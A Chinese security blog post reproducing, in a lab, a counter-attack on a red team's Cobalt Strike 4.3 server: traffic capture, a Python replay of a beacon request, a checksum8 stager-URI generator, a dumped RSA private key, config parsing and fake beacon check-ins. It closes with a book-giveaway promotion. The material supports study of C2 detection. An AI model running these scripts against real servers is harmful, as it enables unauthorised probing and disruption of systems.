> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/i79ziHSIVaJ7mqBfnewRZQ)

公众号

✎ 阅读须知

  

乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。

乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经授权，不得用于其他。

本文所提供的工具仅用于学习，禁止用于其他，请在 24 小时内删除工具文件！！！

01

**Cobalt Strike 反制综述**

  

参考文档：`https://forum.butian.net/share/708`

`Cobalt Strike`近些年来被称之为多人线上运动神器，在目前攻防大背景下，由`Cobalt Strike`展开的红蓝对抗技术不断积累，其中域前置技术、修改特征等手段来躲避各种流量检测工具，而`Cobalt Strike`的特征识别也成为网络空间测绘引擎重点关照的点，而且各种威胁情报中，对于`Cobalt Strike`的特征标记也最常见。如果在我们实战攻防中，遇到了红队使用`Cobalt Strike`来钓鱼等操作时，我们如何在短时间内扰乱红队，甚至将红队的`Cobalt Strike`服务器宕机，又或者是红队使用了域前置技术，短时间内无法溯源的情况下，如何能够扳回一局？本文参考了大量的文章，一起来学习复现一下如何从一个木马到反制红队`Cobalt Strike`服务器。

本文参考了大量的文章，一起来学习复现一下如何从一个木马到反制红队`Cobalt Strike`服务器。

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

02

**本文说明**

  

测试`Cobalt Strike`版本：`4.3`

注意：本文时常跨度较长，文章中部分图可能无法完全对接文字，但是方法都是一模一样的，本文针对的都是内网环境测试，下文如未做特殊说明，`cs`版本均为`4.3`。

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

03

**CS 简单版上线分析**

  

在 Cobalt Strike 没有使用域前置的情况下，进行测试。

在攻击的时候，使用最简单的`Beacon HTTP`模式：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVnQaJoWqMEzXgWuIIqSqnoMOiaF9NhHKDOtkwtoiaaQ3qYypSTTib5M5Xw/640?wx_fmt=png)

生成一个`exe`文件，然后运行在`Windows7`虚拟机中，并准备抓包分析：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVJY0HCf4JZrVNibn6KNMjAxK8wl9cRCgF8UVAIMDPNbuTMEPOwchRhhw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxV09yKpjyyHuoBFae2CB8Ds3r0gHwxSc8Oe27zajnyxEFl3B2n7MhAIQ/640?wx_fmt=png)

监听`vnic0`这张卡，可以监控到虚拟机`win7`的流量：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxV2hEcLUP3QfDm54QicqgTvIjEtfL2yK923YY7BIfqs46l6ia0dWic1vnAQ/640?wx_fmt=png)

双击之后，上线成功，也抓到了流量：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVO9cUblLMLZ6OwVSrZBtl26Cf7vAofSuYSsozlibzgyyUPicSvMPRytjQ/640?wx_fmt=png)

暂停抓包，开始分析：

使用的攻击机 ip 地址为：10.30.7.240 因为使用的是 HTTP 的 beacon，所以在这里使用命令进行过滤：ip.addr == 10.30.7.240 && http 在这里如果在实战中，是没法知道 cs 服务端的 ip 地址的，在这里可以关闭虚拟机的浏览器，确保没有 http 服务的时候，直接使用 http 过滤是一样的：

过滤方法：ip.addr == 10.30.7.240 && http

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVPLkJN7uGQCltv8ny4xp820tfUZreoLVH7bz48fsZT6sdylcJuhk1ZQ/640?wx_fmt=png)

过滤方法：`http`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVImXE6BxuS9hIuqnop64Vd0zm6TkghR1DzzPPPHn9iaPVDKtlhrmAGjA/640?wx_fmt=png)

由此可以看到，当前过滤得到的结果是一样的。

追踪第三条数据可以看到一个`cookie`信息：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVao0cMRxy11HTXSibS7bwzria7RZCV7Ptm0rmFUQVkHlcmgAkkNZJoPwQ/640?wx_fmt=png)

```
GET /IE9CompatViewList.xml HTTP/1.1
Accept: */*
Cookie: Mkq5CSB3bIJnuXwR+A3nCJjQn2c1vYk6XjIUcDQJQao3hqnTIng4zRWayhxpey74n9uBA8mVcRMdrr2LHPqtfOI9Uuysz5v9ACTTydHE5/x6h/tW2MB+J8jonn4Xtl2aaSlPXrmG+njwN1EOTkucrza6bCPdx0WHFLElFtotcZU=
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASP)
Host: 10.30.7.240
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Fri, 24 Dec 2021 08:31:51 GMT
Content-Type: application/octet-stream
Content-Length: 0
```

在这里用一个脚本复现下：  

```
# -*- encoding: utf-8 -*-
# Time : 2021/12/24 16:52:07
# Author: crow
import requests

url = 'http://10.30.7.240:80/IE9CompatViewList.xml'

header = {
    'Accept':'*/*',
    'Cookie': 'Mkq5CSB3bIJnuXwR+A3nCJjQn2c1vYk6XjIUcDQJQao3hqnTIng4zRWayhxpey74n9uBA8mVcRMdrr2LHPqtfOI9Uuysz5v9ACTTydHE5/x6h/tW2MB+J8jonn4Xtl2aaSlPXrmG+njwN1EOTkucrza6bCPdx0WHFLElFtotcZU=',
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASP)',
    'Host': '10.30.7.240',
    'Connection': 'Keep-Alive',
    'Cache-Control': 'no-cache'
        }

res = requests.get(url,headers= header)
# print(res.url)
print('-'*20)
print(res.text) # 无返回
print('-'*20)
print(res.headers) # {'Date': 'Fri, 24 Dec 2021 09:04:53 GMT', 'Content-Type': 'application/octet-stream', 'Content-Length': '0'}
# print('-'*20)
# print(res.status_code)
```

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxV71dia8XUC8bUo8NDjSK4gDpZaAxguhCYOMPfVr7TbzJF7YpC3QZPM6g/640?wx_fmt=png)

在`cs`界面将原来的机器清除，运行之后，`cs`上线。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVyHCtjJEb3aVIqhgUHibuZdKlLqzUhpcXX31ibbZKOzicyyGzkOGISElMA/640?wx_fmt=png)

在这里知道那个`cookie`是非对称`RSA`加密过的，如果想解密，需要一个私钥`Private Key`才能解密。

```
Private Key: MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAMyLIY+FyD/7cPtjZZYgjYVbuRYiF9VkGGrF6yKXl093vLDY9osCXiXOpas96nOApW13O5pet1MD1sMBCEDqTYCWC0qF0+cQDcpc22EIiQk185uMkBx0DuSPsuLo533FCWLtThHE9II7bcOe4jb3AorUv/2SrxAXkXwS6+MrwuQNAgMBAAECgYEArgRATSZ4M1brzDPIHW0cebSLRrVCqZ062LwBS7DEXit0MNClD6a4ClpAv+sxJ4rvMq4Z2z9xoALIF6ctKm0r+RBQJrjHC9IIzKF3+a5+lOKIFdVF2WtSN1L9Njn0of2W/IMlg95U21krq8gZU+7lsISoSGmlWxuiT5xLVSKPWVECQQDl4L5w8XWbUbn+HkXPUpddLVQr7eax9YIPYEZUp9bDAbuwusFp+POug7dMZPFAJ+GkPnfsbsl9Pv+qwr6LXgovAkEA48llmeGPEzD8gZzJWya+rxRxFG+GzQKUq8FVRM2/kjJJ8n9DVbVWQAovDYoOAozdxzYk6IGsN0TvfjRW8KGygwJBAOAmZYx75dGtv06q9idSwYV5zbmIIIsmecvEdM/XWPKNnhaWBELxHavtg65aP2Pvf3ZH82f4H0ChTWuUuXfsGsECQFYLWanLHnStaHS9eQJJnHYeTqjdiBohA2/t0/vtjJP5Ex3bHOBfY3lFX4jJwYkNFSmPNlntwdQO4jjWJJE5Q2kCQFYa/PNGTjYiVikgo5OuB6JQfITp8Ny9v0fKP0LNhmBSjkbKSRz74pA/63eb3NI7+CuB2dJUA9ZuwkkMBwjY5yg=

Public Key: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMiyGPhcg/+3D7Y2WWII2FW7kWIhfVZBhqxesil5dPd7yw2PaLAl4lzqWrPepzgKVtdzuaXrdTA9bDAQhA6k2AlgtKhdPnEA3KXNthCIkJNfObjJAcdA7kj7Li6Od9xQli7U4RxPSCO23DnuI29wKK1L/9kq8QF5F8EuvjK8LkDQIDAQAB
```

关于私钥获取在下一节。

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

04

**Private Key 与 Public Key**

  

现在以上帝视角在`Cobalt Strike`服务器上进行解密：

`java -cp "cobaltstrike.jar" DumpKeys.java`

脚本地址：`https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability/`

此时，注意：

环境要在`JDK11`版本下运行。还要把这个`java`文件放置在 CS 服务器的 CS 文件夹下，与 “`cobaltstrike.jar`“同一个目录下。（参考：https://forum.butian.net/share/708）

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxV4XdYQic468UsvTdcKlwL8S16BXDibg6AGybcRXbicBra2DicpicqeGU2ic8A/640?wx_fmt=png)

```
# -*- encoding: utf-8 -*-
# Time : 2021/12/28 16:15:11
# copy Author: crow
# 脚本内容参考：https://mp.weixin.qq.com/s/BLM8tM88x9oT4CjSiupE2A
# https://www.freebuf.com/articles/network/258138.html
import requests
import random,time

def generate_checksum(input):
    trial = ''
    total = 0
    while total != input:
        total = 0
        trial = ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
                        for i in range(4))
        # print(trial)
        for i in range(4):
            # tmp = trial[i:i+1]
            # print('total的值', total)
            # print('tmp的值：',tmp)
            # print('ord的值：',ord(tmp))
            # print('除后的值：', ord(tmp) % 256)
            # time.sleep(2)
            total = (total + ord(trial[i:i+1])) % 256
            # print(total)
    print('64位的stage:',trial)
    return total
    # print(total)

for j in range(0,6):
    # generate_checksum(92) # 32位
    generate_checksum(93) # 64位
```

在这里就取到了私钥，有了私钥之后可以在线解密：  

解密网站：`https://the-x.cn/cryptography/Rsa.aspx`（我没有解密成功，注意 base64 和 hex 编码等问题），在这放一张解密成功的：![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxV1JLfjHJMHwoxUnYWydgd9JycnfYMqB99XnsBXicB1DdOgPIY7EFuiaLg/640?wx_fmt=png)

图片引用链接：`https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng`

在这里是可以看到上线的主机的若干信息的。

当然，也可以使用`https://github.com/Apr4h/CobaltStrikeScan`中的工具直接解析`Beacon`的配置和`payload`：![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVlp0KoC6icnuHCWdOfiaWTyYu4orVCJfpNSpicOs7Qnu2UPGPPPLGVk1Og/640?wx_fmt=png)使用方法，当木马运行之后，直接在运行木马的机器中，使用命令行中运行该`exe`文件：

`CobaltStrikeScan.exe -p`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVEtMxwO3hicrJEibuo48CTIgeIXAJhEaWPf4J4cPTdMqjdR5O7gMEHe0g/640?wx_fmt=png)

在实际情况中，无法取得私钥的，但是在有公钥的情况下或许就可以直接上线机器，详细分析请见下节。

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

05

**beacon 解密分析**

  

**5.1 上线流程分析**
--------------

5.1 节引用参考：`https://www.secpulse.com/archives/165561.html`![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVpswvia5ImRibFwW1ozxoEFguKYuAjwJ1RyGYLV9OO2UsuGcSJ3K2FHWg/640?wx_fmt=png)

```
攻击者利用CS Server生成新的Beacon监听（包括一对非对称公私钥）并生成Stager；
攻击者投递Stager到受控主机；
受控主机在Exploit阶段执行小巧的Stager；
受控主机根据Stager UrI请求特征向Beacon Staging Server下载体积较大更复杂的Stage到本地，Beacon Staging Server会校验UrI的合法性；
Stage解密并解析Beacon配置信息（比如公钥PublicKey、C2 Server信息）；
Stage通过公钥PublicKey加密主机的元数据并发送至C2 Server；
C2 Server用私钥解密数据获取主机元数据。
从上述流程中，我们能Get到2个核心点：
- Stager Uri校验算法
- Beacon配置的解密算法
```

**5.2 流程分析**
------------

在上述执行上线的操作里面，一共过滤出了`4`个包，其中最关键的就是前`3`个：

  
![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVJPIV5oR5Vk7rOYZFWbLGTvT31FD6QeHO52njInf8lbP5QJaPh2HBMw/640?wx_fmt=png)

> 上线的时候先投递一个小巧的 Stager Payload，然后通过 Stager 去 Beacon Staging Server 的某个 URI 下载完整的 Stage（也就是体积更大功能更复杂的 Payload），并将其注入内存。**这个 URI 作为特征也可以用来识别 CS 服务器，做网络测绘。**CS 中 Stager URI 校验算法，就是生成 4 位的随机校验码，将校验码拼接到 URI 后面即可请求到 Stage 的代码。

以上两段参考至：https://forum.butian.net/share/708

在这里面提到生成 4 位的随机校验码，使用的算法是`Stager URI`校验算法`checksum8`，这个算法的代码部分如下：![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVFy5qZj2kovdnia2sdofvxzqzrQPPQtVmoY05xdL5ib2XbgEQkpopcV2Q/640?wx_fmt=png)图片参考：https://www.cnblogs.com/donot/p/14226788.html

由代码可知，当前的`checksum8`算法执行方法：

从`a-z、A-Z、0-9`字母中，随机使用选择四个字符，在这四个字符计算`ASCII`码的值后求和取模，如果结果等于`92`的为`32位`的，等于`93`为`64位`的，代码如下：

```
# -*- encoding: utf-8 -*-
# Time : 2021/12/28 16:15:11
# copy Author: crow
# 脚本内容参考：https://mp.weixin.qq.com/s/BLM8tM88x9oT4CjSiupE2A
# https://www.freebuf.com/articles/network/258138.html
import requests
import random,time
def generate_checksum(input):
    trial = ''
    total = 0
    while total != input:
        total = 0
        trial = ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
                        for i in range(4))
        # print(trial)
        for i in range(4):
            # tmp = trial[i:i+1]
            # print('total的值', total)
            # print('tmp的值：',tmp)
            # print('ord的值：',ord(tmp))
            # print('除后的值：', ord(tmp) % 256)
            # time.sleep(2)
            total = (total + ord(trial[i:i+1])) % 256
            # print(total)
    print('64位的stage:',trial)
    return total
    # print(total)
for j in range(0,6):
    # generate_checksum(92) # 32位
    generate_checksum(93) # 64位
```

在这里运行每次生成的`4`个字符都是不唯一的，但是结果都是符合`checksum8`算法的，因此在这里只要是端口对应，直接拼接即可下载`stage`文件。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVjPCtut9jBeFdU6j67icn6UY4RsTfL530QeEAibRbJibq0IZqGIC8Vhwibg/640?wx_fmt=png)

因此直接拼接即可，在这里随机拿出来一个进行拼接：`http://10.30.7.240/rMf8`当然，在这里可以用任意其他的均可：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVGXcB024c2gjlTzbIiclNyfAYPtCCbvfDgSae420jmic2Dm4g3HEWBVPg/640?wx_fmt=png)

如果在这里，访问后的地址显示乱码，那也可以将当前的文件使用`Burpsuite`右键保存起来也可以。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVuFmjoVWkovUKedO57ASia2abEGunnH8DykkpfAwt7AzORq6cSicwDO0g/640?wx_fmt=png)

或者直接使用迅雷下载到本地也可以：![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVzohlrOfbAVxL5xibMEQ1RPt8CN7icpAo1zz24qHX8DL6Lw8dYhlUhY3A/640?wx_fmt=png)

`stager`通过`http`的`beacon`上线中，先请求第一个`uri`地址：

```
http://10.30.7.240/rMf8
```

从第一个地址下载:![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVApibmPVaict9VqoswhUHG2rvRvXj0czpdEnRHAlCkK1GbUHye78bhRCQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVW1rK3Kq7Q2rpx80CoNOwDkQlQS8nMkEleN9JIHkuK4DKQFgiagCVwXw/640?wx_fmt=png)

下载之后，对`stage`进行解密：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVofFIVkCcGkeNHZpxjPmEWlfutNuiaJjdnfa0XJ1tZicic6SOzVj9rwrXA/640?wx_fmt=png)

在这里直接使用`https://github.com/Sentinel-One/CobaltStrikeParser`中的代码进行解密，使用方法：在下载下来之后，先使用 `pip3 install -r requirements.txt` 在这里将需要安装的包都安装好：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVf3md9wt6uTb6ic2oNjs2L464Us0QPQOzyHnDib984BYCeP3W171ZXBibg/640?wx_fmt=png)

下载刚刚的`rMf8`文件在当前文件夹下执行命令：`python3 parse_beacon_config.py rMf8 --json > 1228.json`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVUWbMSCh7iaENfwTJxQLqDOm7RulHODicZLOhKp1T2zJYqoM92guNVUFQ/640?wx_fmt=png)

执行命令之后，打开`1228.json`文件，在这里你可以看到`PublicKey`：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVGrBSuibMbfXQGVrhxdozpkVegX5m7Vb14VNLYEAFtuZ1CLQhibzdnAKg/640?wx_fmt=png)

当然这个`PublicKey`中要删除无效`Padding`，删除之后的正确公钥：打开之后的公约：

```
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDTePstpW0kXvni/Dxm+FW/MKoOQ2s3qyUb1234567iZgAyeXh/xN23lD+NPsPqVmjm97hgEMrijirQtQ9n12345670C0/WTFhOF4kv380Y1EvJiTHvzkUarynkPBG34XUmBakmQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
```

正确的公钥：

```
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDTePstpW0kXvni/Dxm+FW/MKoOQ2s3qyUb1234567iZgAyeXh/xN23lD+NPsPqVmjm97hgEMrijirQtQ9n12345670C0/WTFhOF4kv380Y1EvJiTHvzkUarynkPBG34XUmBakmQIDAQAB==
```

有了公钥之后，就可以模拟上线操作了：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxV8ZG5MSsiavkr06PYYxgf46PvHIFOpjU9YwvjibibWuTWgf5Cpw2ZsJDhA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

06

**模拟上线**

  

上线的话，其实有很多师傅已经写好了脚本，在这里直接下载运行即可：`https://github.com/LiAoRJ/CS_fakesubmit`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVDic5aB3njgmcHDRJ7icvyhXIZ1zfagCPUCZtuJf95MBpfp9f8RBFTasg/640?wx_fmt=png)使用方法：直接在`Public_key.txt`中写入你的公钥就行，注意在写的时候，要使用上面的那个`==`结尾的。然后运行脚本：在这里需要输入的`C2 Server`的`URL`地址，在前面的那个流量里面可以看到：

  
![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVR2j6Idia4ibheRUDzHuH0F3bYticGmmrwaOtRR0gIZyQ8X7Zic4Ox3T3SA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVLp10libOIjCiaH8vHdVy4PnqRmZBibicCzuiaBp6yz3ycesZjeDNvwr19NQ/640?wx_fmt=png)至此，发现反制`cs`上线成功。

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

07

**域前置机器上线（失败）**

  

在上面，使用的是未使用域前置的机器，在使用实际的域前置的机器进行测试的时候，发现最后报错，无法上线成功，因为时间问题，具体原因后续再进行分析。

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxV5V5VNdAfRbz5p8zluaf7bnwJlvGbOPyHafnTbDV5iaoWGweMacEBqZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7PuqRWWU6zPRMxSeBfjvKhbuTlWQcqk8L2ib8dROI0fFTknJfEctspUxmbxZwkvG9214pibCEmGWsuEDvDad20tA/640?wx_fmt=png)  

新书抽奖

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQGCeAxCpwiafHPCQ59GvHz6giandwhxYRRbpy9Fg4r24n3DUppDIuN9AdtiaAYaIEm15OGhIfuv6Mzkg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/TN05MmJLxMrNiboff6rhmPUYUNXdWTXZfiaHXPuUGqmPZtqhI6NtGicPMIu6ohOCReWY2C4YZY4AIchDMyal6KWQw/640?wx_fmt=gif)

为了感谢大家长期以来的支持，乌鸦安全开始了送书活动，

这次挑选了《Web 渗透攻防实战》送给 3 位粉丝。  

具体规则如下：  

（1）关注本公众号：乌鸦安全

（2）在本公众号里回复关键字：抽奖  参与抽奖

（3）将本文转发至朋友圈，抽奖前不可删除！抽奖前不可取消公众号关注！

（4）开奖结束后，请中奖的小伙伴及时联系抽奖页面联系方式（超过 48 小时未联系视为自动放弃）

以上条件缺一不可哦！  

本次抽奖活动将在 01 月 08 号 21:00 自动开奖。

      

    过去网络安全距离我们很远，只要没有被攻击便可以忽略，而现在如果存在安全漏洞且一不小心被成功攻击，就可能导致很多公司财务等重要数据被勒索病毒感染，造成巨大经济损失！近几年来，国家展开了护网行动，加上各种机构经常组织 CTF 比赛等，网络安全越来越火，人才缺口也越来越大。“会渗透，是懂安全的基础；会漏扫，是懂渗透的基础；去实战，是检验能力的标准” 此书可以给网络安全领域的专业人士或想入门的人士答疑解惑，是您必不可少的一本专业图书!  

本书从网络攻防实战的角度，对 Web 漏洞扫描利用及防御进行全面系统的研究，由浅入深地介绍了在渗透过程中如何对 Web 漏洞进行扫描、利用分析及防御，以及在漏洞扫描及利用过程中需要了解和掌握的基础技术。

全书共分 10 章，包括漏洞扫描必备基础知识、域名信息收集、端口扫描、指纹信息收集与目录扫描、Web 漏洞扫描、Web 常见漏洞分析与利用、密码扫描及暴力破解、手工代码审计利用与漏洞挖掘、自动化的漏洞挖掘和利用、Web 漏洞扫描安全防御，基本涵盖了 Web 漏洞攻防技术体系的全部内容。书中还以一些典型漏洞进行扫描利用及实战，通过漏洞扫描利用来还原攻击过程，从而可以针对性地进行防御。

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1Ar5g2WODbmaxTd6ibMYtwZic1LzLS237GhaxAibBnqGmGrdX179RxtibyB5EvFicExia0WUON3sd2tOJxA/640?wx_fmt=jpeg)

  

  

点击上方链接，更多优惠等你哦~

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1ARPnm0Bwd12Ymt027PpwehFABXEp9rjHURlkonJFC41yFMoUq9DO84ER84GMqjxibiclREfILNSLqw/640?wx_fmt=png)

欢迎加入一起学习（如果加过 1、2、3 群的师傅就不要再加了哈！）

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1D2pyd9XgHPXUNsngICxRxVD1jpic9RDKYnun6ZZnCe4YaBuCdkbYOSzUvZlzEC03c2ib4cvia6nThpA/640?wx_fmt=png)

tips：加我 wx，拉你入群，一起学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJOca699BJK50FDxBNnhRZrS1hyXb2K4AkLTYfJwticmyHQxv3X6vZHfQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/CibE0jlnugbX5SLGI9312kOrkH7gXIN5NPic75bQ8WbAFMEqvZiaQ0WSk4W9eYUfJJRzlMgibjic8mIGicMvjialoDgmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJkslQQ2B5nDuKBlpbKHHtME5RBrJsYucDbPWpyglY02yicRq93PTWn7w/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

乌鸦安全

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Bt3mgRlo88wGCQuAJ2kv0pzM18jFmpv4CJEBMNAicGSSvDlWSN6DG5JJ0Q8EI6oEuaZS0QNyAojYw/640?wx_fmt=gif)